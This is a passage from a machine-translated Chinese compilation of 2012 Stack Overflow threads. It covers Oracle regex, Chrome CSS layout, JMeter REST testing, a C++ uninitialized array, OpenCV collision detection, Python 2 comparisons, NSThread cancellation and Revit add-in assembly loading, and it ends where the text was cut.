07-19 03:59:06.466: E/AndroidRuntime(629):  at java.lang.reflect.Method.invokeNative(Native Method)
07-19 03:59:06.466: E/AndroidRuntime(629):  at java.lang.reflect.Method.invoke(Method.java:511)
07-19 03:59:06.466: E/AndroidRuntime(629):  at android.view.View$1.onClick(View.java:3039)
07-19 03:59:06.466: E/AndroidRuntime(629):  ... 11 more
07-19 03:59:06.466: E/AndroidRuntime(629): Caused by: java.lang.NullPointerException
07-19 03:59:06.466: E/AndroidRuntime(629):  at com.wajumbie.nasadailyimage.NasaAppActivity.onRefresh(NasaAppActivity.java:36)
07-19 03:59:06.466: E/AndroidRuntime(629):  ... 14 more
07-19 03:59:07.066: I/dalvikvm(629): threadid=3: reacting to signal 3
07-19 03:59:07.086: I/dalvikvm(629): Wrote stack traces to '/data/anr/traces.txt' 
```

# sql - 正则表达式用 Null 替换两个连续的点

> ID：11553853
> 
> 赞同：1
> 
> 时间：2012-07-19T04:14:30.077
> 
> 标签：sql, regex, oracle

我正在尝试用 Null 替换两个相互跟随的点。

```
SQL> select regexp_replace('..','[^\.]+\.','Null') from dual; 
```

产生：

```
RE
--
.. 
```

而我想要：

```
RE
--
Null 
```

如何使用正则表达式实现这一目标？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-19T04:21:10.763

尝试以下操作：

```
SELECT regexp_replace( '..', '\.{2}', 'Null' ) FROM dual; 
```

您的示例使用`^`否定符号（“不匹配`.`”），我不确定这是您的意图。如果您只想匹配`..`字符串的开头，请使用`^`如下：

```
SELECT regexp_replace( '..', '^\.{2}', 'Null' ) FROM dual; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T04:27:31.990

这看起来有点毛茸茸，但对于 regex 参数：

```
(?!\.{3,})\.{2}(?<!\.{3,}) 
```

这将确保没有更多或少于 2 .. 从前面或后面相互跟随。

所以它只会匹配 ..，而不是 ...，不是 .，等等。我假设这就是你想要的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T11:09:00.793

如果您要在一行的开头寻找两个点，那么可能最简单的表达式可能是

`SELECT REGEXP_REPLACE('..', '^\.\.', 'Null') FROM DUAL`

如果您要在该行的任意位置查找两个点，请删除`^`表达式开头的 。

如果您正在寻找构成整行的两个点，请`$`在表达式的末尾添加，如

`'^\.\.$'`

可以在[此处](http://docs.oracle.com/cd/B28359_01/server.111/b28286/ap_posix.htm)找到 Oracle 支持的正则表达式元素的文档。

分享和享受。

# css - Chrome 无法正确呈现菜单图形

> ID：11553855
> 
> 赞同：1
> 
> 时间：2012-07-19T04:14:40.963
> 
> 标签：css, google-chrome

大家好 - 我想知道是否有人可以对我遇到的问题提供任何见解，我无法理解。

查看以下左侧菜单。当它呈现 Chrome 时，您可以看到底部搜索与其他两个在视觉上不一致，“go”按钮出于某种原因悬停在左侧。它适用于我测试过的所有其他浏览器（IE8、IE9、Firefox）

[http://imageshack.us/photo/my-images/14/renderaj.jpg/](http://imageshack.us/photo/my-images/14/renderaj.jpg/)

这是标记：

```
<div id="quickAccess" class="clearfix">

<div class="accessBox courseFinder">

<form id="course-finder" name="gs" method="GET" action="/future/course_search">
<input id="course-keyword-search-field" class="formField" type="text" title="Course Search" name="q" maxlength="256" value="">
<input class="formSearch" type="submit" name="btnG" value="GO">
<input type="hidden" name="entqr" value="0">
<input type="hidden" name="ud" value="1">
<input type="hidden" name="sort" value="date:L:d1">
<input type="hidden" name="output" value="xml_no_dtd">
<input type="hidden" name="oe" value="UTF-8">
<input type="hidden" name="ie" value="UTF-8">
<input type="hidden" name="filter" value="0">
</form>

</div><!-- end accessbox coursefinder -->

<div class="accessBox askUs">

<form action="http://cit.edu.au/images/crm/search.php" method="post" id="askUs-form">
<input id="askus-keyword-search-field" class="formField" type="text" title="AskUs Search" name="askUsKeywords"/>
<input class="formSearch" type="submit" value="GO" />
</form>

</div><!-- end accessbox askus -->

<div class="accessBox search">

<form id="site-search" name="gs" method="GET" action="/home/site_search">
<input id="site-keyword-search-field" class="formField" type="text" title="Site Search" name="q" maxlength="256" value="">
<input class="formSearch" type="submit" name="btnG" value="GO">
<input type="hidden" name="entqr" value="0">
<input type="hidden" name="ud" value="1">
<input type="hidden" name="sort" value="date:L:d1">
<input type="hidden" name="output" value="xml_no_dtd">
<input type="hidden" name="oe" value="UTF-8">
<input type="hidden" name="ie" value="UTF-8">
<input type="hidden" name="filter" value="0">
</form>

</div><!-- end accessbox search -->

</div><!-- end quick access --> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T04:30:48.517

* * *

现在我现在检查你可以这样做并解决你的问题

**给你** `#site-search`的`position`和给你的按钮`right :0;`

```
 #site-search{
        position:relative;
        }
    #quickAccess .search input.formSearch {
    right:0;
position:absolute; // you give to already 
    }
      #quickAccess .accessBox{
      width:187px;
      } 
```

**现场演示** [http://tinkerbin.com/KBGMIGbi](http://tinkerbin.com/KBGMIGbi)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T04:46:31.847

这是由于使用`position:absolute;`for `#quickAccess .accessBox input.formSearch`css make it`position:relative;`

```
#quickAccess .accessBox input.formSearch {
    border-left:1px solid;
    border-right:1px solid;
    padding:0 5px;
    height:32px;
    margin:0 0 0 -4px;
    font-weight:bold;
    font-size:1.2em;
    position:absolute; /*<<<<< ----- It Should be position:relative*/
    -moz-border-radius:0 5px 5px 0;
    -webkit-border-top-right-radius:5px;
    -webkit-border-bottom-right-radius:5px;
    border-radius:0 5px 5px 0;
} 
```

见演示：http: [//jsfiddle.net/akhurshid/txRK9/4/](http://jsfiddle.net/akhurshid/txRK9/4/)

# spring - 通过 JMETER 测试 Spring RESTful 服务。如何为 XML 数据提供多个动态输入？

> ID：11553857
> 
> 赞同：1
> 
> 时间：2012-07-19T04:14:41.690
> 
> 标签：spring, rest, jmeter

```
@RequestMapping(method=RequestMethod.POST, value="/employeeXML")
public ModelAndView addEmployeePostXMl(@RequestBody String body) {
    Source source = new StreamSource(new StringReader(body));
    Employee e = (Employee) jaxb2Mashaller.unmarshal(source);
    employeeDS.add(e);
    List<Employee> employees = employeeDS.getAll();
    EmployeeList list = new EmployeeList(employees);
    return new ModelAndView(XML_VIEW_NAME, "employees", list);
} 
```

我可以为单个 POST 正文测试它，即

```
<employee>
   <id>3</id>
   <name>guest3</name>
   <email>guest3@ibm.com</email>
</employee>. 
```

但是如何检查它是否有多个 DYNAMIC 值，例如 CSV 文件。如果我使用带有数据的 csv 文件：

```
3   aFFaFD       xfchghcxh
4   dsfgsdF      cxhchcxht
5   asFDdsF      chcxhcg
6   sdFsF        cxhxhcgh
7   SDFsF        cghcxhcg
8   gfzsgzd      cxghchc
9   hgfxhfx      cghchgc
10  fghxf        ghcxhxc
11  fhgfxh       cghchcc
12  ghcxxh       cxhcghch
13  chgxgcvx     cghchcxgch
14  hgxfhxch     cxhgxchcg
15  ghcxhcx      vmcvmnvbm
16  cghch        bnmvmbh
17  cxghcxhcx    mvbhgn
18  cxghcxh      mnmcghmh
19  cxghcxhxch   mnvmvmcv
20  xcghchcx     mvcmvmv 
```

它给出了解组异常，因为帖子正文应该是 XML 格式。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T18:04:04.660

尝试使用[JMeterRestSampler](https://github.com/smartrics/JMeterRestSampler) - 用于测试 REST 服务的自定义 jmeter 采样器：

*   [RestSampler 项目](https://github.com/smartrics/JMeterRestSampler)
*   [JMeter 测试暴露 REST API 的系统的健壮性](http://smartrics.blogspot.com/2009/04/jmeter-to-test-robustness-of-system.html)

您可以将它与以下架构一起使用：

```
线程组
    . . .
    While Controller 
    Condition: ${__javaScript("${email}"!="<EOF>",)} *// 直到 EOF* 
        CSV 数据集配置
        文件名：[包含测试数据的文件的路径]
        变量名：id,name,email
        REST 采样器

```

```
 <employee>
                <id>${id}</id>
                <name>${name}</name>
                <email>${email}</email>
            </employee> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-30T20:21:58.703

[http://www.mightythor.net/jmeter.html](http://www.mightythor.net/jmeter.html)

可用于从 JMeter 运行 RESTfull 服务。

# c++ - 这是分配非常量数组的合法举措吗？

> ID：11553858
> 
> 赞同：0
> 
> 时间：2012-07-19T04:14:54.160
> 
> 标签：c++

我创建了这段代码来解决一些有效的在线答案，但我想知道以这种方式分配动态内存是否可以。数组大小在整个循环中连续定义。没事吧？

```
#include <iostream>
using namespace std;

int main ()
{
    int sum=0;
    int x;
    int *ptr = new int[x];
    ptr[0]=1;
    ptr[1]=2;

    int max = 4000000;

    int i=2;

    while (ptr[i-2]<max)            
    {
        ptr[i]=ptr[i-1]+ptr[i-2];
        i++;
    }
    // now we use (i -1) as the last array fill b/c i is bigger than 4 000 000
    // sort with val % 2 == 0  !modulus!

    for (int j=0; j<(i-1); j++) {
        if (ptr[j]%2==0) {
            sum+=ptr[j];
        }
    }

    delete[] ptr;

    cout<<sum;
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T04:16:40.333

不，这不行，因为`int x;`它未初始化并且可能包含一些垃圾。
**编辑。**
从评论到这篇文章。
1) 使用`std::vector<int>`而不是 C 数组。
2）如果不想使用向量 - 添加循环计算元素，然后为数组分配内存并使用它。
3）如果第一种和第二种情况没有接近，请使用一些大尺寸的静态数组。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T04:25:27.193

不，因为`int x`未初始化！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-19T04:31:37.503

您的代码存在许多问题：

1.  `x`未初始化为初始值，因此它可能是一些随机值。
2.  `while`循环使用意味着`ptr[i-2] < max`(i) 需要至少两个数组元素，即`x`必须设置为不低于 2 的数字，并且 (ii)`< max`正在比较数组中的值但没有索引检查 i 是在 2 和用 分配的数组元素的数量之间`new`。（当 (ii)`i++`在`while`循环中与 with 结合时，这意味着它`i`可能会在分配数组的末尾继续增加。

您需要设置`x`为正确的值并添加检查以确保您在访问数组的代码中永远不会访问任何数组索引 < 0 或任何索引 >= x `ptr`。

`std::vector`如果您自己手动管理内存，请考虑改用。

**编辑：**看起来您的代码打算计算斐波那契数列并对偶数求和。要修复您的代码，应该这样做：

1.  添加`#include <vector>`.
2.  删除`int x;`
3.  删除`int *ptr = new int[x];`并替换为`std::vector<int> v;`.
4.  替换`ptr[0]=1`为`v.push_back(1);`。
5.  替换`ptr[1]=2`为`v.push_back(2);`。
6.  替换整个 while 循环。

由于您似乎正在计算斐波那契数列，因此您可以`int i=2`在 for 循环的初始化部分循环使用，同时`v.back() < max`每次添加一个，即`++i`. For 循环对此非常有用。在循环中，您可以`v.push_back(v[i-1],v[i-2]);`计算下一个数字并将其附加到数组中。

至于`v.push_back(val)`这将添加`val`到向量的末尾（即最高索引），如果需要，增长向量（内部使用动态内存）。`v.back()`是向量的最后一个元素，即`v[v.size()-1]`仅当`v.empty()`is时等价于`false`。

1.  您的评论提到了 for 循环计算更大的值。但是，您的 while 循环不会-- 不是`i-2`倒数`i-1`第二个元素 -- 而不是最后一个元素。当且仅当它 >= 4000000 时，使用`std::vector`它更容易简单地删除最后一个元素。这可以使用 if 语句来处理，即`if (v.back() >= max)`then `v.pop_back();`。
2.  调整你的 for 循环（即`i`应该是`v.size()`）。
3.  删除`delete[] ptr;`。

如果您想**直接**使用动态内存分配，那么代码必须以不同的方式编写，并且会更长更复杂，因为您必须能够“调整”数组的大小（这需要分配更多内存，将旧内容复制到新的，然后摧毁旧的）。但是，一般来说，您应该使用标准库容器并避免直接管理内存。在这种情况下`std::vector`，仅使用几行代码就非常适合执行此任务。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-19T04:31:44.180

如前所述，`x`当您尝试将其用作要分配的数组大小时，它是未初始化的。

然而，更重要的是，那时您并不真正*知道*您需要多大的数组（我很确定它*可以*计算出来，但我们现在暂且不说）。

由于您事先不知道大小，因此您几乎需要分配一些空间，产生一些结果，检查大小，腾出更多所需空间，然后继续直到达到目标。或者，您可以做一些非常*微不足道*的数学运算，对可能的最大尺寸给出一个安全（如果有些松散）的估计。由于您从 1、2 开始，并且每个单元格都会比前一个单元格大，因此可以肯定地说，所需的最大可能大小不会超过`max/2 = 2000000`.

或者，您可以只使用`std::vector`，它已经为处理此类情况而构建。

# ios - 在 iPad 上使用 OpenCV 避免碰撞

> ID：11553861
> 
> 赞同：3
> 
> 时间：2012-07-19T04:15:11.697
> 
> 标签：ios, image-processing, opencv, computer-vision, opticalflow

我正在做一个需要使用 OpenCV 实现碰撞避免的项目。这将在 iOS 上完成（iOS 5 及更高版本可以）。

项目目标：这个想法是在汽车的仪表板上安装一个 iPad 并启动应用程序。应用程序应该从相机中抓取帧并处理这些帧以检测汽车是否会与任何障碍物发生碰撞。

我是任何类型的图像处理的新手，因此我在这个项目中陷入了概念层面。

到目前为止我所做的：

*   看看 OpenCV 并在网上阅读它。使用 Lukas-Kanade Pyramid 方法实现碰撞避免。这是正确的吗？
*   使用这个项目作为起点：[http](http://aptogo.co.uk/2011/09/opencv-framework-for-ios/) ://aptogo.co.uk/2011/09/opencv-framework-for-ios/它在我的 iPad 上成功运行，并且捕获功能也可以正常工作，这意味着相机捕获很好 -融合的。我更改了 processFrame 实现以尝试使用光流而不是 Canny 边缘检测。这是功能（还不完整）。

    ```
     -(void)processFrame {
        int currSliderVal = self.lowSlider.value;
        if(_prevSliderVal == currSliderVal) return;
        cv::Mat grayFramePrev, grayFrameLast, prevCorners, lastCorners, status, err;

        // Convert captured frame to grayscale for _prevFrame
        cv::cvtColor(_prevFrame, grayFramePrev, cv::COLOR_RGB2GRAY);
        cv::goodFeaturesToTrack(grayFramePrev, prevCorners, 500, 0.01, 10);
        // Convert captured frame to grayscale for _lastFrame
        cv::cvtColor(_lastFrame, grayFrameLast, cv::COLOR_RGB2GRAY);
        cv::goodFeaturesToTrack(grayFrameLast, lastCorners, 500, 0.01, 10);

        cv::calcOpticalFlowPyrLK(_prevFrame, _lastFrame, prevCorners, lastCorners, status, err);
        self.imageView.image = [UIImage imageWithCVMat:lastCorners];
        _prevSliderVal = self.lowSlider.value;
    } 
    ```

*   阅读有关光流的信息以及如何（从概念上）使用它来检测即将发生的碰撞。总结：如果一个物体的尺寸在增长，但朝着框架的任何边缘移动，那么它就不是碰撞路径。如果一个对象的大小在增长，但没有向任何边缘移动，那么它就在碰撞路径上。这是正确的吗？
*   这个项目（http://se.cs.ait.ac.th/cvwiki/opencv:tutorial:optical_flow）似乎正在做我想要实现的目标。但是通过阅读代码，我不明白它是如何做到的。我无法运行它，因为我没有 linux 机器。我阅读了这个网页上的解释，它似乎到达了一个单应矩阵。这个结果如何用于避免碰撞？

除了上面提到的四点之外，我已经阅读了很多关于这个主题的内容，但仍然无法将所有部分放在一起。

这是我的问题（请记住我是新手）

1.  光流如何用于检测即将发生的碰撞？我的意思是，假设我能够从函数 cv::calcOpticalFlowPyrLK() 中获得正确的结果，我如何从那里向前推进以检测与框架上任何对象即将发生的碰撞？是否有可能测量与我们最有可能碰撞的物体的距离？

2.  是否有一个示例工作项目可以实现此功能或我可以查看的任何类似功能。我在 eosgarden.com 上查看了该项目，但其中似乎没有实现任何功能。

3.  在上面的示例代码中，我将 lastCorners 转换为 UIImage 并在屏幕上显示该图像。这向我展示了一个在屏幕上只有彩色水平线的图像，与我的原始测试图像没有任何相似之处。这是该功能的正确输出吗？

4.  我在理解这个项目中使用的数据类型时有点困难。InputArray、OutputArray 等是 OpenCV API 接受的类型。然而在 processFrame 函数中， cv::Mat 被传递给 Canny 边缘检测方法。我是否将 cv::Mat 传递给 prevImage 和 nextImage 的 calcOpticalFlowPyrLK()？

提前致谢 ：）

**更新：**找到这个示例项目 (http://www.hatzlaha.co.il/150842/Lucas-Kanade-Detection-for-the-iPhone)。它不能在我的 mac 上编译，但我认为从这里我将有一个用于光流的工作代码。但是我仍然无法弄清楚，如何通过跟踪这些点来检测阻碍碰撞。如果你们中的任何人甚至可以回答 Qts。1号，会有很大帮助。

**更新**看起来像光流用于计算 FoE（扩展焦点）。可以有多个 FoE 候选人。并且使用 FoE，可以得出 TTC（碰撞时间）。后面的部分我不是很清楚。但是，到目前为止我是对的吗？**OpenCV 是否实现 FoE 和/或 TTC？**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-27T23:36:56.057

### 1

> 光流如何用于检测即将发生的碰撞？

我从未使用过光流，但第一个谷歌请求给了我这篇论文：

[使用光流检测障碍物](http://www.araa.asn.au/acra/acra2005/papers/low.pdf)

不知道你有没有读过。它显示了如何估计每个角度的接触时间。

### 2

> 这向我展示了一个在屏幕上只有彩色水平线的图像，与我的原始测试图像没有任何相似之处。

我想 goodFeaturesToTrack 的输出不是图像，而是点表。例如，请参阅[如何在 Python 示例中使用它们](http://opencv.willowgarage.com/documentation/python/cookbook.html#using-goodfeaturestotrack)（在旧版本的 OpenCV 中）。这可能同样适用于 calcOpticalFlowPyrLK 的输出。先看看调试中有什么。我通常使用 Python + OpenCV 来了解不熟悉的 OpenCV 函数的输出。

### 4

> 我在理解这个项目中使用的数据类型时有点困难。InputArray、OutputArray 等是 OpenCV API 接受的类型。然而在 processFrame 函数中， cv::Mat 被传递给 Canny 边缘检测方法。我是否将 cv::Mat 传递给 prevImage 和 nextImage 的 calcOpticalFlowPyrLK()？

从[文档](http://docs.opencv.org/modules/core/doc/basic_structures.html#inputarray)中：

> 这是将只读输入数组传递给 OpenCV 函数的代理类。.... `_InputArray`是一个可以从`Mat`, `Mat_<T>`, `Matx<T, m, n>`, `std::vector<T>`,`std::vector<std::vector<T> >`或构造的类`std::vector<Mat>`。它也可以从矩阵表达式构造。

所以你可以通过`Mat`。*一些较旧的函数仍然只* 期望`Mat`.

# python - 为什么 `object() > 0` 在 Python 中为真？

> ID：11553862
> 
> 赞同：5
> 
> 时间：2012-07-19T04:15:19.993
> 
> 标签：python

```
In [32]: object() > 0
Out[32]: True 
```

事实上，它比我尝试过的任何整数都大。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-07-19T04:17:19.917

因为 Python 2.x 试图在不同类型的对象之间进行可用的比较（即使它们没有意义）。

它已在 Python 3 上修复：

```
>>> object() > 0
Traceback (most recent call last):
  File "<pyshell#320>", line 1, in <module>
    object() > 0
TypeError: unorderable types: object() > int() 
```

Python 2.x 中使用的顺序：

```
None < Numbers < [Other types in alphabetical order] 
```

数字是：`int`，`bool`但`float`不是`complex`因为它们无法比较

此外，来自旧样式类的对象（命名`instance`对象）出于某种奇怪的原因`None`而停留在两者之间。`Numbers`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-19T04:24:14.680

它正在比较对象的**地址**。如果您了解 C/C++，这就是指针运算。

```
>>> object() < object()
True
>>> object() > object()
False 
```

在第一个示例中，第一个 object() 恰好比第二个更早地在内存中分配，因此它“小于”另一个。

无论如何，你不应该像这样比较指针。:)

# objective-c - Objective-C - 取消线程？

> ID：11553863
> 
> 赞同：1
> 
> 时间：2012-07-19T04:15:20.730
> 
> 标签：objective-c, ios, nsthread

我的应用程序中有一个搜索功能，用户在 textField 中键入，随着文本的更改，我正在搜索本地数据库并在表中填充数据。

根据输入的文本，搜索可能需要 1 到 10 秒，所以我决定使用线程。每次文本更改时，我都想取消线程（如果已经运行），并使用 new 关键字再次启动它。问题是根据文档调用取消不能保证线程将被杀死。那么这里的解决方案是什么？

有没有办法杀死一个线程？

```
- (void)populateData
{
   if (self.searchThread.isExecuting)
   {
       [self.searchThread cancel];
   }

   [self.searchThread start];
}

- (void)populateDataInBackground
{
   @autoreleasepool
   {
      // get data from db
      // populate table on main thread
   }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-19T04:26:59.127

您不希望线程必然死亡，因为它稍后会被重用（制作线程很昂贵）。您应该做的是将您的工作分解成尽可能多的部分，并在每个部分之间检查您的线程的`isCancelled`属性是否为`YES`. 如果是这样，请在不更新的情况下返回。

`[NSThread currentThread]`当你在里面时应该返回你的线程`populateDataInBackground`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-19T06:31:11.987

我最终修改了我的 dataStorage 以一次返回 10 个项目，只是为了测试。我以后可能会使用另一个号码。这样我就可以在我的 while 循环中退出线程。

另一个优点是，通过这种方式，我可以在浏览项目时填充表格，而不是等待所有数据都被检索到。

```
@interface ViewController

@property (nonatomic, strong) NSthread *searchThread;

@end

@implementation ViewController
@synthesize searchThread = _searchThread;

- (void)populateData
{
   [self.searchThread cancel];

   self.searchThread = [[NSThread alloc] initWithTarget:self selector:@selector(populateDataInBackground) object:nil];
   [self.searchThread start];
}

- (void)populateDataInBackground
{
   @autoreleasepool
   {
      [self.array removeAllObjects];

      // I added paging functionality to my sql, so I get let's say 10 records at a time
      while (/*has data*/)
      {
          NSArray *arrayOf10 = [self.dataStorage getdatafromIndex:startingIndex withCount:10];

          if ([[NSThread currentThread] isCancelled])
               [NSThread exit];

          [self.array addObjects:arrayOf10];
          [self.tableView performSelectorOnMainThread:@Selector(reloadData) withObject:nil waitUntilDone:NO];
      }
   }
}

@end 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-19T04:24:36.040

一些可能的解决方案之一包括：

`BOOL`从您的主线程（例如“ ”）设置一些“ ”信号量/属性，`searchNow`并在您执行“ `populateData`”后台线程/任务时定期读取它。

如果状态变为“NO”（假设“ `searchNow`” == YES 意味着任务应该继续），则退出您的后台线程。

# c# - 负载装配问题

> ID：11553869
> 
> 赞同：0
> 
> 时间：2012-07-19T04:16:27.100
> 
> 标签：c#

我正在为应用程序编写加载项。AddIn 是一个 Dll，它位于特定文件夹 %APPDATA&/Application/AddIns/MyAddIn

因此，我有一个包含多个项目的解决方案，并且 MyAddInFolder 包含以下文件：

```
IVC.Common.dll 
IVC.MaterialCatalogEditorAddIn.dll
IVC.MaterialCatalogEditor.dll 
```

应用程序调用位于**IVC.MaterialCatalogEditorAddIn.dll**和**IVC.MaterialCatalogEditorAddIn.dll**中的方法（引用**IVC.MaterialCatalogEditor.dll**和**IVC.MaterialCatalogEditor.dll**引用**IVC.Common.dll）**

**IVC.MaterialCatalogEditor.dll**中有一个 WPF froms 。并在 xaml 文件中引用了**IVC.Common.dll**

当我尝试从应用程序执行 AddIn 命令时，出现异常“无法加载程序集**IVC.Common.dll** ”

我使用了 FusionLogViewer，我得到了以下消息日志

```
Assembly manager loaded from:  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
Running under executable  C:\Program Files\Autodesk\Revit Structure 2012\Program\Revit.exe
--- A detailed error log follows. 

=== Pre-bind state information ===
LOG: User = SK\ChekalinVV
LOG: DisplayName = IVC.MaterialCatalogEditor, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
 (Fully-specified)
LOG: Appbase = file:///C:/Program Files/Autodesk/Revit Structure 2012/Program/
LOG: Initial PrivatePath = NULL
LOG: Dynamic Base = NULL
LOG: Cache Base = NULL
LOG: AppName = Revit.exe
Calling assembly : IVC.MaterialCatalogEditorAddIn, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null.
===
LOG: This bind starts in LoadFrom load context.
WRN: Native image will not be probed in LoadFrom context. Native image will only be probed in default load context, like with Assembly.Load().
LOG: Using application configuration file: C:\Program Files\Autodesk\Revit Structure 2012\Program\Revit.exe.Config
LOG: Using host configuration file: 
LOG: Using machine configuration file from C:\Windows\Microsoft.NET\Framework64\v4.0.30319\config\machine.config.
LOG: Policy not being applied to reference at this time (private, custom, partial, or location-based assembly bind).
LOG: Attempting download of new URL file:///C:/Program Files/Autodesk/Revit Structure 2012/Program/IVC.MaterialCatalogEditor.DLL.
LOG: Attempting download of new URL file:///C:/Program Files/Autodesk/Revit Structure 2012/Program/IVC.MaterialCatalogEditor/IVC.MaterialCatalogEditor.DLL.
LOG: Attempting download of new URL file:///C:/Program Files/Autodesk/Revit Structure 2012/Program/IVC.MaterialCatalogEditor.EXE.
LOG: Attempting download of new URL file:///C:/Program Files/Autodesk/Revit Structure 2012/Program/IVC.MaterialCatalogEditor/IVC.MaterialCatalogEditor.EXE.
LOG: Attempting download of new URL file:///C:/Users/ChekalinVV/AppData/Roaming/Autodesk/Revit/Addins/2012/IVC/FamilyManager/IVC.MaterialCatalogEditor.DLL.
LOG: Assembly download was successful. Attempting setup of file: C:\Users\ChekalinVV\AppData\Roaming\Autodesk\Revit\Addins\2012\IVC\FamilyManager\IVC.MaterialCatalogEditor.dll
LOG: Entering run-from-source setup phase.
LOG: Assembly Name is: IVC.MaterialCatalogEditor, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
LOG: Where-ref bind Codebase does not match what is found in default context. Keep the result in LoadFrom context.
LOG: Binding succeeds. Returns assembly from C:\Users\ChekalinVV\AppData\Roaming\Autodesk\Revit\Addins\2012\IVC\FamilyManager\IVC.MaterialCatalogEditor.dll.
LOG: Assembly is loaded in LoadFrom load context. 
```

这里一切正常。IVC.MaterialCatalogEditorAddIn.dll调用 * **IVC.MaterialCatalogEditor.dll** * 在 AddIn 文件夹*中*

但下一个日志：

```
Assembly manager loaded from:  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
Running under executable  C:\Program Files\Autodesk\Revit Structure 2012\Program\Revit.exe
--- A detailed error log follows. 

=== Pre-bind state information ===
LOG: User = SK\ChekalinVV
LOG: DisplayName = IVC.Common, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
 (Fully-specified)
LOG: Appbase = file:///C:/Program Files/Autodesk/Revit Structure 2012/Program/
LOG: Initial PrivatePath = NULL
LOG: Dynamic Base = NULL
LOG: Cache Base = NULL
LOG: AppName = Revit.exe
Calling assembly : PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35.
===
LOG: This bind starts in default load context.
LOG: Using application configuration file: C:\Program Files\Autodesk\Revit Structure 2012\Program\Revit.exe.Config
LOG: Using host configuration file: 
LOG: Using machine configuration file from C:\Windows\Microsoft.NET\Framework64\v4.0.30319\config\machine.config.
LOG: Policy not being applied to reference at this time (private, custom, partial, or location-based assembly bind).
LOG: Attempting download of new URL file:///C:/Program Files/Autodesk/Revit Structure 2012/Program/IVC.Common.DLL.
LOG: Attempting download of new URL file:///C:/Program Files/Autodesk/Revit Structure 2012/Program/IVC.Common/IVC.Common.DLL.
LOG: Attempting download of new URL file:///C:/Program Files/Autodesk/Revit Structure 2012/Program/IVC.Common.EXE.
LOG: Attempting download of new URL file:///C:/Program Files/Autodesk/Revit Structure 2012/Program/IVC.Common/IVC.Common.EXE.
LOG: All probing URLs attempted and failed. 
```

PresebtationFramework 程序集尝试调用**IVC.Common.dll**并尝试仅从应用程序文件夹加载。

为什么一个 dll 尝试从 AddIn 文件夹加载，而另一个 dll 仅尝试从应用程序文件夹加载？以及如何解决我的问题。

所有项目都有任何 CPU 平台目标。该应用程序是 x64。

当我从测试可执行应用程序加载**IVC.MaterialCatalogEditor.dll时，一切正常。**

**编辑了** 一些代码：

**IVC.MaterialCatalogEditorAddIn.dll**中的主要代码

 **```
[Transaction(TransactionMode.ReadOnly)]
    public class Command : IExternalCommand
    {
        public Result Execute(
          ExternalCommandData commandData,
          ref string message,
          ElementSet elements)
        {            

            MaterialsWindow materialsWindow =
                new MaterialsWindow();
            materialsWindow.DataContext = 
                new MaterialsViewModel();

            materialsWindow.ShowDialog();

            return Result.Succeeded;
        }
    } 
```

MaterialsWindow 类和 MaterialsViewModel 类位于**IVC.MaterialCatalogEditor.dll**

**调试器在IVC.MaterialCatalogEditor.dll**的这部分 xaml 上显示错误：

```
<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
                    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"                    
                    xmlns:ViewModel="clr-namespace:IVC.MaterialCatalogEditor.ViewModel"
                    xmlns:Common="clr-namespace:IVC.Common;assembly=IVC.Common">
<DataTemplate
            DataType="{x:Type Common:ResourceWithCharge}">
<!-- Some data template -->
</DataTemplate>
</ResourceDictionary> 
```

**EDITED 2** 我已经编写了与我的工作解决方案具有相同结构的测试解决方案。当我从测试应用程序启动它时，它没有任何错误。但是，如果我从 AddIn 执行它，它会失败并显示“无法加载程序集 Common.dll”

[测试解决方案](https://dl.dropbox.com/u/62538318/Revit/TestAssemblyResolveProject.zip)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T15:24:19.033

虽然装配探测失败，但您有几种方法可以走：

1.  使用 app.config 文件更改程序集绑定
2.  通过附加到当前应用程序域的 AssemblyResolve 并使用 c# 代码加载必要的程序集来处理程序集加载失败。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-12-27T14:33:40.893

这是因为 IVC.Common.dll 在加载`Assembly.Load()`已编译的 XAML (BAML) 时由 WPF 在默认上下文中加载。

您应该尝试以这种方式编辑 Revit.exe.config：

```
<runtime>
  <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
    <dependentAssembly>  
     <assemblyIdentity name="IVC.Common" />  
       <codeBase href="<Not sure how you can put %APPDATA% here>\Application\AddIns\MyAddIn\IVC.Common.dll"/>  
     </dependentAssembly>  
  </assemblyBinding>
</runtime> 
```**

# php - 使用PHP检查Android数组中的值是否存在于MySQL列中，如果存在则返回记录

> ID：11553871
> 
> 赞同：0
> 
> 时间：2012-07-19T04:16:41.847
> 
> 标签：php, android, mysql, json, web-services

我是 PHP 新手，我一直在研究如何使用 PHP Web 层从 Android 向 MySQL 发送和接收数据。我之前已经准备好我的代码来创建 Java 字符串数组`emailAddresses[]`，`phoneNumbers[]`其中分别包含电话联系人的所有电子邮件地址和电话号码。

